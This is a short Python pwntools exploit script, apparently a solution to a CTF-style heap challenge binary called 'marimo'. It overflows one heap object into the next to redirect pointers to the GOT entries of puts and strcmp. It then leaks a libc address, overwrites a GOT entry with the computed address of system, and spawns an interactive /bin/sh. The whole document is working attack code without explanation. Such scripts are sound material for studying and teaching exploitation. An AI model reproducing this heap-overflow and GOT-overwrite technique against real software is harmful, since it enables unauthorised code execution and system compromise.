#usr/bin/python

from pwn import *

r = process('./marimo')
print util.proc.pidof(r)

put_got = 0x603018
strcmp_got = 0x603040

def create(name,profile):
	r.recvuntil('>>')
	r.sendline('show me the marimo')
	r.recvuntil('>>')
	r.sendline(name)
	r.recvuntil('>>')
	r.send(profile)

def view(index,profile,modify=False):
	r.recvuntil('>>')
	r.sendline('V')
	r.recvuntil('>>')
	r.sendline(str(index))
	if modify == True:
		r.recvuntil('>>')
		r.sendline('M')
		r.recvuntil('>>')
		r.sendline(profile)
		r.recvuntil('>>')
		r.sendline('B')
	else:
		r.recvuntil('>>')
		r.sendline('B')

create('A'*16,'B'*32) # marimo 0
create('C'*16,'D'*32) # marimo 1
sleep(3) # let marimo grow

payload = ''
payload += 'D'*32
payload += p64(0) + p64(0x21) # prev size and size
payload += p64(0x15aae814e)
payload += p64(put_got)
payload += p64(strcmp_got)

view(0,payload,True) # overflow next marimo heap

# leak libc
r.recvuntil('>>')
r.sendline('V')
r.recvuntil('>>')
r.sendline('1')
r.recvuntil('name :')
leak = u64(r.recvuntil('\n').strip().ljust(8,'\x00'))
libc = leak - 0x6f690
log.info('libc base is:%s' % hex(libc))
system_addr = libc + 0x45390
log.info('one gadget address is:%s' % hex(system_addr))
r.recvuntil('>>')
r.sendline('B')

r.recvuntil('>>')
r.sendline('V')
r.recvuntil('>>')
r.sendline('1')
r.recvuntil('>>')
r.sendline('M')
r.recvuntil('>>')
r.sendline(p64(system_addr)*2)

r.recvuntil('>>')
r.sendline('B')

r.recvuntil('>>')
r.sendline('/bin/sh\x00')

r.interactive()